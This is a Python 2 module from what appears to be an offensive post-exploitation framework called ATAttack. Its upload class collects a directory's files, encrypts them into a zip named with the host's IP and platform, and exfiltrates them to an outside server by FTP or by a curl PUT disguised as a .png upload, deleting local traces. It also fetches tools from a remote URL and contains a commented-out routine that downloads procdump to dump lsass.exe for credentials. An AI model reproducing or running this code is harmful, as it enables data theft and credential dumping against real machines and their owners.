#! /usr/bin/env python2.7
# -*- coding:UTF-8 -*-

import pyminizip
import socket
import zipfile
import platform
import ftplib
import requests

from ATAttack.framework.prints import *
from ATAttack.framework.constant import constant
import os

random_exe = s_rangdom() + ".exe"
random_zip = s_rangdom() + "_" + ".zip"

class upload(object):

    def __init__(self,credentials):
        try:
            self.hostname = socket.gethostbyname(socket.gethostname())
            self.f = ftplib.FTP(credentials.host)
            self.f.login(credentials.username, credentials.password)
            print_warning('Successful connection to FTP server')
        except Exception:
            print_error("Unable to connect to FTP server")
            pass

    def ziprandom(self):
        ip_address = self.hostname
        file_name = s_rangdom() + "_" + ip_address + "_" + platform.platform()
        return file_name

    def zipDir(self,dirpath, outFullName):
        try:
            zip = zipfile.ZipFile(outFullName, "w", zipfile.ZIP_DEFLATED)
            for path, dirnames, filenames in os.walk(dirpath):
                fpath = path.replace(dirpath, '')
                for filename in filenames:
                    if filename.endswith(".exe"):
                        pass
                    elif filename.endswith(".zip"):
                        pass
                    elif filename.endswith(".rar"):
                        pass
                    else:
                        zip.write(os.path.join(path, filename), os.path.join(fpath, filename))
            zip.close()
        except Exception:
            pass

    def encrypt(self,dirpath):
        '''
        压缩包加密
        :param dirpath:
        :return:
        '''
        self.zipDir(dirpath, random_zip)
        compression_level = 9
        filename = random_zip
        virtual = self.ziprandom()
        pyminizip.compress(filename, "", virtual,
                           "Za!@#$@&**(aKg", compression_level)
        os.remove(random_zip)
        return virtual

    def HTTPupload(self,url, localfile):
        """
        上传接口
        :param url:
        :return:
        """
        try:
            if not os.path.exists('curl.exe') :
                self.HTTPdownload(constant.curl_url, "curl.exe")
            command = 'curl.exe -X PUT --upload-file {localfile} {url}/{remotefile}'.format(
                localfile=localfile, url=url, remotefile=s_rangdom()+ ".png")
            print command
            os.popen(command).read()
            os.remove(localfile)
        except Exception as e:
            print e.message


    def HTTPdownload(self,url, filename='output.txt'):
        '''
        下载接口
        :param url:
        :param filename:
        :return:
        '''
        requ = requests.get(url, stream=True, verify=False)
        with open(filename, 'wb') as fd:
            for chunk in requ.iter_content(chunk_size=5120):
                if chunk:
                    fd.write(chunk)
        return filename


    def get_FileSize(self,filePath):
        fsize = os.path.getsize(filePath)
        fsize = fsize / float(1024 * 1024)
        return round(fsize, 2)

    def ftp_upload(self,file_remote):
        '''
        ftp上传接口
        :param file_remote:
        :return:
        '''
        try:
            file_local = file_remote
            bufsize = 1024
            fp = open(file_local, 'rb')
            self.f.storbinary('STOR ' + file_remote, fp, bufsize)
            fp.close()
            # f.quit()
            os.remove(file_remote)
        except Exception:
            return False

    def ftp_download(self,remote, local):
        try:
            bufsize = 1024
            fp = open(local, 'wb')
            self.f.retrbinary('RETR %s' % remote, fp.write, bufsize)
            fp.close()
            return local
        except Exception:
            return False

    # def lsass_dump(self):
    #     try:
    #         print_error(
    #             'Export failed. Attempt to download procdump export remotely')
    #         print_error("Try procdump export again")
    #         file_exe = self.download(constant.lsass_name, random_exe)
    #         # file_path = os.path.join(os.getcwd() + "\\" + constant.dump_name)
    #         os.popen(file_exe +" -accepteula -ma lsass.exe " +
    #             constant.dump_name)
    #         os.remove(random_exe)
    #         print_success('Successfully exported lsass.exe process')
    #         # dump = zipfile.ZipFile(random_zip, 'w', zipfile.ZIP_DEFLATED)
    #         # dump.write(file_path, constant.dump_name)
    #         # dump.close()
    #         # ftp_upload(random_zip)
    #         # os.remove(constant.dump_name)
    #         # os.remove(file_exe)
    #     except Exception:
    #         print_error("Export lsass.exe failed")
